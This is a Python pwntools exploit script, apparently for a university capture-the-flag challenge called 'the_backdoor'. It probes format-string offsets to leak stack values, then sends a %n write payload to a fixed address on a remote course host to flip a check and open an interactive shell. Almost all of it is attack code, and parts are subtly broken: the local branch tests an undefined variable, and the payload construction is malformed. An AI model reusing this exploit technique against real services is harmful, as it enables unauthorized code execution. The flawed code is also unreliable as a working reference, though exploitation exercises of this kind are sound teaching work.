#! /usr/bin/python

from pwn import *
from time import sleep

got_shell = False
local=False
"""
static analysis:
CHECKSEC:
	Arch:     amd64-64-little
	RELRO:    Partial RELRO
	Stack:    Canary found
	NX:       NX enabled
	PIE:      No PIE (0x400000)

[+] Found AT_RANDOM at 0x7fffffffdf99, reading 8 bytes
[+] The canary of process 5260 is 0x92f316ab6f52df00

# address of variable code: 0x601084 / 64b: 0x00000000601084

"""
context.log_level = "critical"
context.terminal = ["terminator", "-e"]

host, port = "tpas.alunos.dcc.fc.up.pt", 5012



for i in range(200):

	if local:
		sh = process('./the_backdoor', aslr=False)

		try:
			sh.recvuntil("> ")
			fmt_string = "AAAAAAAA"+ "%"+str(i)+"$16x" +" | "+ "%"+str(i)+"$16x" +" | "+ "%"+str(i)+"$16s"

			# fmt_string = '%'+str(i)+'$x' + " || " + '%'+str(i)+'$p' + " || " + '%'+str(i)+'$s' # $n to write the variable		
			sh.sendline(fmt_string)

			#payload = '1337' + '%'+p64(0x601084)+'$n'
			#sh.sendline(payload)


			print sh.recv().split("\n")[0].split(",")[-1].strip() # leak stack
			
			#print sh.clean()
			if "Nope" not in res:
				print "we got a shell"
				got_shell = True
				break
			#attach(sh)

			sh.close()
			# when we get a shell
			#sh.interactive()
			
		except:
			# EOF
			continue
	else:

		sh = remote(host, port);
		sh.recvuntil("> ")
		# fmt_string = "AAAAAAAAAAA "+"%8x "*40
		fmt_string = "1337 "+"%"+p32(0x601084)+"$n"
		sh.sendline(fmt_string)
		res = sh.clean().split("\n")[0].split(",")[-1].strip()
		if "Nope" in res:
			print res
			sh.close()
		else:
			got_shell=True
		break

if got_shell:	
	sh.interactive()